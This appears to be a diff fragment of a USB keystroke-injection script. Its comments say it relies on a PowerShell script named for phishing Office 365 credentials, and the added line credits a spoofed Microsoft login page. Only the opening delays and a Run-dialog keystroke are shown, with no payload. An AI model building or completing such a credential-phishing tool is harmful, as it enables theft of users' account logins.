@@ -13,7 +13,7 @@ REM '  `'-'`|`-' /                 |         |\ \._,\ '/|_|                  `
 REM          '..'                  |_________| `--'  `"
 
 REM This script needs the PowerShell script Phish_Office365-onUSB.ps1 to be on a USB drive.
-
+REM The HTML for this script was borrowed from https://github.com/JoniRinta-Kahila/microsoft-login-spoof, kudos for creating this great look-a-like! 
 DELAY 1000
 GUI r
 DELAY 1000
